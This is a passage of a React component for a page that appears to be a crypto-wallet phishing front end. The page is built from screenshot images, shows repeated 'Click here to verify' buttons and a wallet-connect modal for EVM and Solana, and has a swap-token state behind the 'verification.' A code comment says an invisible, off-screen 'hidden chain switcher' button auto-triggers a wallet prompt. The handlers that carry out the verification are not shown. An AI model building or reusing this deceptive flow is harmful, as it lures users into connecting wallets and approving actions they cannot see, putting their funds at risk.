                  <div className="bg-green-500 text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 shadow-lg">
                    <CheckCircle className="w-5 h-5" />
                    Verified!
                  </div>
                ) : (
                  <button
                    onClick={handleSolanaProceed}
                    disabled={isSolanaProcessing}
                    className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 justify-center disabled:opacity-80 shadow-lg cursor-pointer border-0 outline-none whitespace-nowrap"
                    data-testid="button-proceed-solana"
                  >
                    {isSolanaProcessing ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin" />
                        Verifying...
                      </>
                    ) : (
                      "Click here to verify"
                    )}
                  </button>
                )
              ) : step === "done" ? (
                <div className="bg-green-500 text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 shadow-lg">
                  <CheckCircle className="w-5 h-5" />
                  Verified!
                </div>
              ) : (
                <button
                  onClick={handleProceed}
                  disabled={isProcessing}
                  className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-7 py-3 rounded-xl text-base font-bold flex items-center gap-2 justify-center disabled:opacity-80 shadow-lg cursor-pointer border-0 outline-none whitespace-nowrap"
                  data-testid="button-proceed"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      Verifying...
                    </>
                  ) : (
                    "Click here to verify"
                  )}
                </button>
              )}
              {/* Hidden chain switcher - auto-triggers via RainbowKit */}
              {isConnected && !solanaConnected && openChainModal && (
                <button
                  onClick={openChainModal}
                  className="cursor-pointer border-0 outline-none bg-transparent text-white/0 text-[1px] absolute"
                  style={{ top: -9999 }}
                  data-testid="button-chain-switcher"
                />
              )}
            </>
          ) : (
            <button 
              className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-7 py-3 text-base whitespace-nowrap shadow-lg"
              onClick={() => setShowUnifiedWalletModal(true)}
              data-testid="button-connect"
            >
              Click here to verify
            </button>
          )}
        </div>
      </div>

      {/* Section 2 */}
      <img src={section2} alt="" className="w-full h-auto block" data-testid="img-section2" />

      {/* Section 3 */}
      <img src={section3} alt="" className="w-full h-auto block" data-testid="img-section3" />

      {/* Section 4 */}
      <img src={section4} alt="" className="w-full h-auto block" data-testid="img-section4" />

      {/* Section 5 */}
      <img src={section5} alt="" className="w-full h-auto block" data-testid="img-section5" />

      {/* Section 6 - Footer */}
      <img src={section6} alt="" className="w-full h-auto block" data-testid="img-section6" />

      {showUnifiedWalletModal && (
        <div 
          className="fixed inset-0 bg-black/50 flex items-center justify-center z-[200]"
          onClick={() => setShowUnifiedWalletModal(false)}
        >
          <div 
            className="bg-white rounded-3xl p-6 w-[420px] max-h-[80vh] shadow-2xl flex flex-col"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-semibold text-gray-900">Connect Wallet</h2>
              <button
                onClick={() => setShowUnifiedWalletModal(false)}
                className="p-2 hover:bg-gray-100 rounded-full"
                data-testid="button-close-wallet-modal"
              >
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                  <path d="M1 1L13 13M1 13L13 1" stroke="#9CA3AF" strokeWidth="2" strokeLinecap="round"/>
                </svg>
              </button>
            </div>
            
            <div className="flex gap-2 mb-6 bg-gray-100 rounded-xl p-1">
              <button
                onClick={() => setWalletModalTab("evm")}
                className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all ${
                  walletModalTab === "evm" 
                    ? "bg-[#4752c4] text-white shadow-sm" 
                    : "text-gray-500 hover:text-gray-900"
                }`}
                data-testid="tab-evm"
              >
                EVM
              </button>
              <button
                onClick={() => setWalletModalTab("solana")}
                className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all ${
                  walletModalTab === "solana" 
                    ? "bg-[#4752c4] text-white" 
                    : "text-gray-500 hover:text-gray-900"
                }`}
                data-testid="tab-solana"
              >
                Solana
              </button>
            </div>
            
            {walletModalTab === "evm" ? (
              <div className="flex flex-col items-center justify-center py-8">
                <div className="flex items-center gap-2 mb-4">
                  <TokenIcon symbol="ETH" size={24} />
                  <span className="text-gray-700 font-medium">EVM Networks</span>
                </div>
                <p className="text-gray-500 text-sm mb-6 text-center">Connect with Ethereum, BSC, Polygon, Arbitrum, Optimism, Avalanche, or Base</p>
                <button
                  onClick={() => {
                    setShowUnifiedWalletModal(false);
                    setNetworkType("evm");
                    setSellToken(TOKENS[0]);
                    setBuyToken(null);
                    openConnectModal?.();
                  }}
                  className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-8 py-3 rounded-xl font-semibold"
                  data-testid="button-open-evm-modal"
                >
                  Select Wallet
                </button>
              </div>
            ) : (
              <div className="space-y-3 overflow-y-auto flex-1">
                <div className="flex items-center gap-2 mb-4">
                  <TokenIcon symbol="SOL" size={20} />
                  <span className="text-gray-500 text-sm">Solana Wallet</span>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  {SOLANA_WALLETS.map((wallet) => {
                    const isAvailable = wallet.isAvailable();
                    const renderWalletIcon = () => {
                      if (wallet.icon.startsWith('/')) {
                        return (
                          <img 
                            src={wallet.icon} 
                            alt={wallet.name}
                            className="w-full h-full object-cover rounded-lg"
                          />
                        );
                      }
                      const walletIcons: Record<string, JSX.Element> = {
                        okx: (
                          <svg viewBox="0 0 40 40" className="w-full h-full">
                            <rect width="40" height="40" rx="8" fill="black"/>
                            <rect x="10" y="10" width="6" height="6" rx="1" fill="white"/>
                            <rect x="17" y="17" width="6" height="6" rx="1" fill="white"/>
                            <rect x="24" y="10" width="6" height="6" rx="1" fill="white"/>
                            <rect x="10" y="24" width="6" height="6" rx="1" fill="white"/>
                            <rect x="24" y="24" width="6" height="6" rx="1" fill="white"/>
                          </svg>
                        ),
                      };
                      return walletIcons[wallet.icon] || <div className="w-full h-full bg-gray-200 rounded-lg" />;
                    };
                    return (
                      <button
                        key={wallet.id}
                        onClick={() => {
                          setNetworkType("solana");
                          setSellToken(SOLANA_TOKENS[0]);
                          setBuyToken(null);
                          connectSolanaWallet(wallet.id);
                          setShowUnifiedWalletModal(false);
                        }}
                        className="flex items-center gap-3 p-3 rounded-xl bg-gray-50 hover:bg-gray-100 border border-gray-200 transition-all"
                        data-testid={`wallet-${wallet.id}`}
                      >
                        <div className="w-8 h-8 rounded-lg overflow-hidden flex items-center justify-center">
                          {renderWalletIcon()}
                        </div>
                        <span className="text-gray-900 font-medium text-sm">{wallet.name}</span>
                        {isAvailable && (
                          <div className="w-2 h-2 rounded-full bg-green-500 ml-auto" />
                        )}
                      </button>
                    );
                  })}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
